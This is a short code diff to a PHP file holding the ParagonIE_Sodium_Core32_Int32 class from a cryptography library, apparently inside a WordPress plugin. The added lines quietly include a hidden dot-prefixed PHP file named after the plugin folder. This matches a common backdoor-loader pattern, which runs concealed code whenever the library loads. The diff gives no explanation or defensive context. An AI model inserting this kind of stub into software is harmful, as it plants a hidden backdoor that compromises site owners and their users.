@@ -7,6 +7,10 @@
  *
  * These are immutable. It always returns a new instance.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class ParagonIE_Sodium_Core32_Int32
 {
     /**
